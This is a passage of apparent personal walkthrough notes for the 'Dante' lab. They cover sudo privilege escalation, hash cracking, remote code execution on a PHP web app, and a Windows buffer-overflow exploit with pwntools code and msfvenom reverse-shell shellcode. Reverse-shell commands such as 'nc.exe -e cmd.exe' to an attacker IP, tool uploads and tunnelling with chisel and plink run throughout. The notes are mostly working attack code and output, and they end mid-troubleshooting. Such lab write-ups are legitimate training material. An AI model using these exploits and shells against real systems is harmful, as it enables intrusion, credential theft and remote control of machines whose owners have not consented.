-l	// If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. A longer list format is used if this option is specified multiple times and the security policy supports a verbose output format.
```

```text
Matching Defaults entries for ben on DANTE-NIX04:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User ben may run the following commands on DANTE-NIX04:
    (ALL, !root) /bin/bash
```

	ls /home		// ben, julian
	cat /etc/passwd	// ben, julian

Run command as user:

	sudo -u julian /bin/bash	// Welcometomyblog

```text
-u	// Run the command as a user other than the default target user (usually root).
```

Escalate privileges:

	python3 -m http.server 80	// serve linpeas.sh
	,/linpeas.sh
	
```text
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                         
Sudo version 1.8.27
```

	searchsploit sudo

```text
sudo 1.8.27 - Security Bypass	| linux/local/47502.py
```

Exploit sudo 1.8.27 vulnerability: [^7]

	exit					// exit back to ben account
	sudo -u#-1 /bin/bash	// exploit vulnerability; enter password: Welcometomyblog

```text
root@DANTE-NIX04:/#
```

	cat /root/flag.txt	// DANTE{sudo_M4k3_me_@_Sandwich}

	cat /etc/passwd

```text
julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::	// save to hash.txt
```

	john hash.txt --wordlist=rockyou.txt --format=md5crypt-long	// manchesterunited

Next box!

	proxychains nmap -sT -sV -Pn -T5 172.16.1.102

```text
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.5)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.5)
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

	proxychains firefox 172.16.1.102	// "Online Marriage Registration System"

	searchsploit Online Marriage Registration System
	
```text
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Online Marriage Registration System (OMRS) 1.0 - Remote Code Execution (2)         | php/webapps/49260.py
Online Marriage Registration System (OMRS) 1.0 - Remote code execution (3)         | php/webapps/49557.py
Online Marriage Registration System 1.0 - 'searchdata' SQL Injection               | php/webapps/49307.txt
Online Marriage Registration System 1.0 - Persistent Cross-Site Scripting          | php/webapps/48522.txt
Online Marriage Registration System 1.0 - Remote Code Execution (1)                | php/webapps/48552.sh
----------------------------------------------------------------------------------- ---------------------------------
```

	searchsploit -m php/webapps/49557.py
	mv 49557.py exploit.py

The exploit requires new user registration:

	proxychains firefox http://172.16.1.102/user/signup.php
	proxychains python3 exploit.py -u http://172.16.1.102/ -c 'whoami' -m 1111111111 -p test	// dante-ws03\blake

Upload nc.exe to target:

	python3 -m http.server 80
	proxychains python3 exploit.py -u http://172.16.1.102/ -c "powershell wget 10.10.16.52/nc.exe -o nc.exe" -m 1111111111 -p test

Get shell:

	nc -lvnp 9001

	proxychains python3 exploit.py -u http://172.16.1.102/ -c "nc.exe -e cmd.exe 10.10.16.52 9001" -m 1111111111 -p test

Get flag:

	type c:\users\blake\Desktop\flag.txt	// DANTE{U_M4y_Kiss_Th3_Br1d3}

# MinatoTW strikes again

There's a non-standard folder:

	cd c:\Apps
	dir
	
```text
SERVER.EXE
```

Check for locally running services:

	netstat -nat | findstr LIST

```text
TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING       InHost
```

Let's forward this port to our local machine using plink: [^8]

	wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe	// locally
	python3 -m http.server 80										// serve it
	cd c:\Users\blake\AppData\Local\Temp
	mkdir trash
	cd trash
	powershell wget 10.10.16.52/plink.exe -o plink.exe				// get it

	plink.exe -R 4444:127.0.0.1:4444 -l root -P 22 -pw toor 10.10.16.52
	

```text
-R			// [listen-IP:]listen-port:host:portPattern scanning and language processing.

-l user		// connect with specified username
-P port		// connect to specified port
-pw passwd	// login with specified password
```

	nc -nv 127.0.0.1 4444

```text
(UNKNOWN) [127.0.0.1] 4444 (?) : Connection refused	// I get a connection attempt but it's refused for some reason.
```

Check active connections:

	netstat -o	// In my case there is none since it was refused. Otherwise I'd have a PID...

Compare PID with running services:

	tasklist | findstr <PID>	// and would see SERVER.EXE running on port 4444.

Let's get SERVER.EXE onto our running machine and see if we can extract some credentials from the binary:

	nc -lvnp 3333 > server.exe						// locally
	nc.exe 10.10.16.52 3333 < C:\Apps\SERVER.EXE	// remotely

	strings server.exe | grep -A3 Access			// "Access" would have been shown from the nc connection

```text
-A NUM, --after-context=NUM
              Print NUM lines of trailing context  after  matching  lines.   Places  a  line  containing  a  group
              separator  (--)  between  contiguous groups of matches.  With the -o or --only-matching option, this
              has no effect and a warning is given.
```

```text
Enter Access Name: 
Admin
Access Password: Pattern scanning and language processing.

Wrong username!
P@$$worD
Correct Password!
```

Reverse Engineer binary to find credentials:

	sudo apt-get install ghidra

Run ghidra. Create a Project. Load SERVER.EXE. Run CodeBrowser.

	Window => Defined Strings => Filter: Password	// "Correct Password!"
	Click "Correct Password"						// shows corresponding function name in Listing Window.
	Symbol Tree => Browse to that function			// FUN_10476cb0
	Functions => F => FUN_104 => FUN_1047 => FUN_10476 => FUN_10476cb0
	Window => Decompile: FUN_10476cb0

We confirm that the function FUN_10476cb0 contains the password validation logic.
thunk_FUN_10484890 looks like a strcpy_s call, where it is copying the user input 2048 (0x800)
bytes in size to a destination buffer of only 1024 bytes in size.

```c
void __cdecl FUN_10476cb0(char *param_1)

{
  int iVar1;
  char local_404 [1024];
  
  _strncpy_s(local_404,0x801,param_1,0x800);
  iVar1 = _strncmp(&DAT_104d79a0,s_P@$$worD_104d51a8,8);
  if (iVar1 == 0) {
    thunk_FUN_10476fd0(s_Correct_Password!_104d51b4);
  }
  else {
    thunk_FUN_10476fd0(s_Wrong_password!_104d51c8);
  }
  return;
}
```

This is a clear buffer overflow. Let's run the binary on our machine and add a rule to forward the port.

Note: The target system (as of the time of writing) is Windows 10 Pro 64-bit (10.0.18363, Build 18363). Windows evaluation VMs can be downloaded from the Microsoft Developer site here. [^9]

Let's test this on our home lab first.

Test on Windows only:

	1) run SERVER.EXE in cmd.exe.
	2) run nc.exe 127.0.0.1 4444 in another cmd.exe.

```text
Dante Server 1.0
Enter Access Name: Admin
Access Password: P@$$worD
Correct Password!
```

Test between Kali and Windows:

In Windows powershell:

	netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=3333 connectaddress=127.0.0.1 connectport=4444 protocol=tcp

```text
The command forwards the connection from port 3333 on 0.0.0.0 to port 4444 on localhost, allowing us to access the  service. Let's validate the vulnerability by sending more than 1024 bytes of data in the password field.
```

Attacking machine:

	sudo ifconfig eth1 10.10.0.1
	sudo ifconfig eth1 netmask 255.255.255.0
	nc -nv 10.10.0.2 3333

```text
Dante Server 1.0
Enter Access Name:
```

Open binary in Immunity Debugger: [^10]

	File => Open => SERVER.EXE
	Debug => Run

Let's generate a cyclic pattern. Download mona plugin to: [^11]

	C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands

Create the pattern:

	!mona pattern_create 1500

```text
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4

0BADF00D   [+] Preparing output file 'pattern.txt'
0BADF00D       - (Re)setting logfile pattern.txt
0BADF00D   Note: don't copy this pattern from the log window, it might be truncated !
0BADF00D   It's better to open pattern.txt and copy the pattern from the file
```

Find pattern offset:

	!mona pattern_offset 33694232

```text
0BADF00D   Looking for 2Bi3 in pattern of 500000 bytes
0BADF00D    - Pattern 2Bi3 (0x33694232) found in cyclic pattern at position 1028
```

We can use pwntools [^12] to script the connection and the sending / receiving of data. Pwntools is designed to make exploit writing as simple as possible and allows for rapid prototyping. It can be installed using pip.

	apt-get update
	apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev
	build-essential
	python3 -m pip install --upgrade pip
	python3 -m pip install --upgrade pwntools

Script connection and sending/receiving of data

```python
from pwn import *
import sys

if len(sys.argv) < 3:
	print "Usage: {} ip port".format(sys.argv[0])
	sys.exit()

ip = sys.argv[1]
port = sys.argv[2]

payload = "A" * 1028 + "B" * 4 + "C" * 500

r = remote(ip, port)
r.recvuntil(':')
r.sendline("Admin")
r.recvuntil(':')
r.sendline(payload)
```

	python3 bof_win.py 10.10.0.2 3333 // doesn't work

Convert Python 2 script:

	2to3-2.7 bof_win.py -w

```bash
RefactoringTool: Skipping optional fixer: buffer
RefactoringTool: Skipping optional fixer: idioms
RefactoringTool: Skipping optional fixer: set_literal
RefactoringTool: Skipping optional fixer: ws_comma
RefactoringTool: Refactored bof_win.py
--- bof_win.py  (original)
+++ bof_win.py  (refactored)
@@ -2,7 +2,7 @@
 import sys
 
 if len(sys.argv) < 3:
-    print "Usage: {} ip port".format(sys.argv[0])
+    print("Usage: {} ip port".format(sys.argv[0]))
     sys.exit()
 
 ip = sys.argv[1]
RefactoringTool: Files that were modified:
RefactoringTool: bof_win.py
```

```python
from pwn import *
import sys

if len(sys.argv) < 3:
    print("Usage: {} ip port".format(sys.argv[0]))
    sys.exit()

ip = sys.argv[1]
port = sys.argv[2]

payload = "A" * 1028 + "B" * 4 + "C" * 500

r = remote(ip, port)
r.recvuntil(':')
r.sendline("Admin")
r.recvuntil(':')
r.sendline(payload)
```

	python3 bof_win.py 10.10.0.2 3333	// success

```text
EAX 00000010
ECX 00000002
EDX 0019F918
EBX 00312000
ESP 0019FD54 ASCII "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
EBP 41414141
ESI 00464C28 ASCII "0LF"
EDI 00464CA0
EIP 42424242
```

Now that we have an EIP overwrite, we can use it to jump to an area that we control. Looking at the stack on the bottom-right window, we see the start of our As as we scroll up.

```text
0019FD40   41414141  AAAA
0019FD44   41414141  AAAA
0019FD48   41414141  AAAA
0019FD4C   41414141  AAAA
0019FD50   42424242  BBBB
0019FD54   43434343  CCCC
0019FD58   43434343  CCCC
0019FD5C   43434343  CCCC
0019FD60   43434343  CCCC
```

We can jump to the top of the stack, which is pointed to by ESP. This can be achieved by using a JMP ESP instruction, which jumps to the address pointed to by ESP. JMP ESP instructions can be found using mona.

	!mona jmp -r esp

```text
0BADF00D   [+] Writing results to jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 3
0BADF00D   [+] Results :
10476D73     0x10476d73 : jmp esp | ascii {PAGE_EXECUTE_READ} [server.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\server.exe)
104A3FC5     0x104a3fc5 : jmp esp |  {PAGE_EXECUTE_READ} [server.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\server.exe)
104C33A2     0x104c33a2 : jmp esp |  {PAGE_EXECUTE_READ} [server.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\server.exe)
0BADF00D       Found a total of 3 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:01.265000
```

Let’s make EIP point to the first instruction and take control of program execution. Edit the script and add the address of the JMP ESP instruction.

```text
# 0x10476d73 : jmp esp | ascii {PAGE_EXECUTE_READ} [server.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\server.exe)
payload = "A" * 1028 + "\x73\x6d\x47\x10" + "C" * 500
```

Due to little-endian notation, 0x10476d73 is represented as 0x73, 0x6d, 0x47, 0x10. Double-click on this address in the Log window, right-click > Breakpoint > Toggle, or just hit F2 to set a breakpoint.

```text
[19:09:04] Breakpoint at server.10476D73
```

Restart the server and run the script again. Once the breakpoint is hit, we see that EIP is populated with the address of the JMP ESP instruction.

```text
EAX 00000010
ECX 00000002
EDX 0019F918
EBX 003D2000
ESP 0019FD54 ASCII "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
EBP 41414141
ESI 00564C28 ASCII "0LV"
EDI 00564F00
EIP 10476D73 server.10476D73
```

Hit F7 to single-step through the code. We can see that ESP is pointing to start of the Cs.

```text
0019FD53   1043 43          ADC BYTE PTR DS:[EBX+43],AL
0019FD56   43               INC EBX
0019FD57   43               INC EBX
0019FD58   43               INC EBX
```

This is where we’ll place our shellcode to be executed by the program. The tool msfvenom is useful for generating payloads in various formats. We can use it to generate 32-bit reverse shell shellcode.

```python
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x00\x01\x68"
buf += b"\x02\x00\x27\x0f\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
```

After generation, paste the shellcode into the script and edit it as follows:

```python
from pwn import *
import sys

if len(sys.argv) < 3:
    print("Usage: {} ip port".format(sys.argv[0]))
    sys.exit()

ip = sys.argv[1]
port = sys.argv[2]

buf =  b""
buf += b"\xbf\xd9\x3b\x25\x24\xd9\xc5\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x7a\x12\x83\xc2\x04\x03\xa3\x35\xc7"
buf += b"\xd1\xaf\xa2\x85\x1a\x4f\x33\xea\x93\xaa\x02\x2a\xc7"
buf += b"\xbf\x35\x9a\x83\xed\xb9\x51\xc1\x05\x49\x17\xce\x2a"
buf += b"\xfa\x92\x28\x05\xfb\x8f\x09\x04\x7f\xd2\x5d\xe6\xbe"
buf += b"\x1d\x90\xe7\x87\x40\x59\xb5\x50\x0e\xcc\x29\xd4\x5a"
buf += b"\xcd\xc2\xa6\x4b\x55\x37\x7e\x6d\x74\xe6\xf4\x34\x56"
buf += b"\x09\xd8\x4c\xdf\x11\x3d\x68\xa9\xaa\xf5\x06\x28\x7a"
buf += b"\xc4\xe7\x87\x43\xe8\x15\xd9\x84\xcf\xc5\xac\xfc\x33"
buf += b"\x7b\xb7\x3b\x49\xa7\x32\xdf\xe9\x2c\xe4\x3b\x0b\xe0"
buf += b"\x73\xc8\x07\x4d\xf7\x96\x0b\x50\xd4\xad\x30\xd9\xdb"
buf += b"\x61\xb1\x99\xff\xa5\x99\x7a\x61\xfc\x47\x2c\x9e\x1e"
buf += b"\x28\x91\x3a\x55\xc5\xc6\x36\x34\x82\x2b\x7b\xc6\x52"
buf += b"\x24\x0c\xb5\x60\xeb\xa6\x51\xc9\x64\x61\xa6\x2e\x5f"
buf += b"\xd5\x38\xd1\x60\x26\x11\x16\x34\x76\x09\xbf\x35\x1d"
buf += b"\xc9\x40\xe0\xb2\x99\xee\x5b\x73\x49\x4f\x0c\x1b\x83"
buf += b"\x40\x73\x3b\xac\x8a\x1c\xd6\x57\x5d\x29\x2d\x57\x9c"
buf += b"\x45\x33\x57\xb9\x9a\xba\xb1\xaf\xb4\xea\x6a\x58\x2c"
buf += b"\xb7\xe0\xf9\xb1\x6d\x8d\x3a\x39\x82\x72\xf4\xca\xef"
buf += b"\x60\x61\x3b\xba\xda\x24\x44\x10\x72\xaa\xd7\xff\x82"
buf += b"\xa5\xcb\x57\xd5\xe2\x3a\xae\xb3\x1e\x64\x18\xa1\xe2"
buf += b"\xf0\x63\x61\x39\xc1\x6a\x68\xcc\x7d\x49\x7a\x08\x7d"
buf += b"\xd5\x2e\xc4\x28\x83\x98\xa2\x82\x65\x72\x7d\x78\x2c"
buf += b"\x12\xf8\xb2\xef\x64\x05\x9f\x99\x88\xb4\x76\xdc\xb7"
buf += b"\x79\x1f\xe8\xc0\x67\xbf\x17\x1b\x2c\xcf\x5d\x01\x05"
buf += b"\x58\x38\xd0\x17\x05\xbb\x0f\x5b\x30\x38\xa5\x24\xc7"
buf += b"\x20\xcc\x21\x83\xe6\x3d\x58\x9c\x82\x41\xcf\x9d\x86"

payload = b"\x41" * 1028 + b"\x73\x6d\x47\x10" + b"\x90" * 20 + buf + b"\x43" * (500 - len(buf))

r = remote(ip, port)
r.recvuntil(':')
r.sendline("Admin")
r.recvuntil(':')
r.sendline(payload)
```

Exploit:

	ifconfig
	
```text
tun0:	10.10.16.52
```
	
	msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.52 LPORT=9999 -b "\x00\x0a\x0d" -f python

Replace the shellcode in bof_win.py

	python3 bof_win.py 172.16.1.102 3333
	nc -lvnp 9999

I'm having trouble getting my exploit over to the .102 box so I'm switching things up to port forward my connection using chisel.

Transfer chisel to DANTE-WEB-NIX01:

	nc -lvnp 80 < chisel								// in Dante/www
	ssh -D 1080 balthazar@10.10.110.100					// SSH into DANTE-WEB-NIX01 and open port 1080 for proxychains
	bash -c "cat < /dev/tcp/10.10.16.52/80 > chisel"	// on DANTE-WEB-NIX01
	md5sum chisel										// cfc3a23ca9d85803f0c502f8156fc088
	chmod 777 chisel									// on DANTE-WEB-NIX01

Start listening server on our Kali box:

	chisel server -p 8000 -reverse -v

Connect to our Kali box over port 8000, and have our box open port 8001:

	./chisel client 10.10.16.52:8000 R:8001:172.16.1.102:80	// 172.16.1.102 is my next target
	
```text
version `GLIBC_2.32' not found (required by ./chisel)	// we need to recompile chisel for the target system's glibc version
```

Download chisel binary from github repository and try again. [^13]

```text
2022/01/04 03:34:57 server: Reverse tunnelling enabled
2022/01/04 03:34:57 server: Fingerprint ijzp8qvdecpfRjsleY2PDGx35/6ZYhsDlsbG1bvKsQY=
2022/01/04 03:34:57 server: Listening on http://0.0.0.0:8000
2022/01/04 03:35:00 server: session#1: Handshaking with 10.10.110.100:43084...
2022/01/04 03:35:01 server: session#1: Verifying configuration
2022/01/04 03:35:01 server: session#1: Client version (1.7.6) differs from server version (0.0.0-src)
2022/01/04 03:35:01 server: session#1: tun: Created
2022/01/04 03:35:01 server: session#1: tun: SSH connected
2022/01/04 03:35:01 server: session#1: tun: proxy#R:8001=>172.16.1.102:80: Listening
2022/01/04 03:35:01 server: session#1: tun: Bound proxies
```

```text
2022/01/04 00:45:52 client: Connecting to ws://10.10.16.52:8000
2022/01/04 00:45:54 client: Connected (Latency 49.660241ms)
```

Register user:

	proxychains firefox 127.0.0.1:8001/user/signup.php

Test vulnerability:

	proxychains python3 ./exploit.py -u http://172.16.1.102 -m 1111111111 -p test -c "whoami"	// we get code execution

The exploit requires new user registration:

Upload nc.exe to target:

	python3 -m http.server 80
	proxychains python3 ./exploit.py -u http://172.16.1.102 -m 1111111111 -p test -c "powershell wget nc.exe -o nc.exe"

Upload chisel to target:
	
	python3 -m http.server 80
	proxychains python3 exploit.py -u http://172.16.1.102/ -c "powershell wget 10.10.16.52/chisel_1.7.6_windows_amd64.exe -o chisel.exe" -m 1111111111 -p test

Get shell:

	nc -lvnp 9001

	proxychains python3 exploit.py -u http://172.16.1.102/ -c "nc.exe -e cmd.exe 10.10.16.52 9001" -m 1111111111 -p test

Work in Temp/garbage:

	cd C:\Users\blake\AppData\Local\Temp\
	mkdir C:\Users\blake\AppData\Local\Temp\garbage
	cd C:\Users\blake\AppData\Local\Temp\garbage
	copy C:\xampp\htdocs\user\images\chisel.exe C:\Users\blake\AppData\Local\Temp\garbage

Connect from victim client to attacker server:

	chisel.exe client 10.10.16.52:8000 R:8001:172.16.1.102:4444	// make sure no other client is using 4444


NOTE: I've been having trouble with plink and chisel so I took a detour to pwn hackthebox:reddish. I think I figured out how to reverse pivot for Dante. Here's a copy paste:

Restart our chisel client to open port 6379:

	./chisel client --fingerprint sw4f8cHIX6F/7wUx6dJ8V36X4MgxLcl4tOwymk+6NgI= 10.10.16.12:8000 R:127.0.0.1:6379:172.19.0.3:6379

	nmap -sT -sC -sV -p 6379 localhost

```text
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```

So basically all I have to do is run a chisel server on my kali box and make a reverse client connection to it from the DANTE-WEB-NIX01 box with both of the R: ports being 4444. So I think it would be like this:

	chisel server -p 8000 -reverse -v																// kali; note fingerprint
	./chisel client --fingerprint <fingerprint> <my_tun0>:8000 R:127.0.0.1:4444:172.16.1.102:4444	// on DANTE-WEB-NIX01

I'm still working on the reddish box. Maybe something else needs to be done with the msfvenom payload listening port. Let's see. Progress!

# References

[^1]: https://wpvulndb.com/wordpresses/541
[^2]: https://gtfobins.github.io/
[^3]: https://www.php.net/manual/en/wrappers.php
[^4]: https://www.webmin.com/security.html
[^5]: https://www.exploit-db.com/exploits/48512
[^6]: https://www.exploit-db.com/exploits/48505
[^7]: https://www.exploit-db.com/exploits/47502
[^8]: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
[^9]: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
[^10]: https://www.immunityinc.com/products/debugger/
[^11]: https://github.com/corelan/mona
[^12]: http://docs.pwntools.com/en/stable/
[^13]: https://github.com/jpillora/chisel/releases/

- https://karol-mazurek95.medium.com/dante-guide-htb-a7dfd0387a9c	// dante guide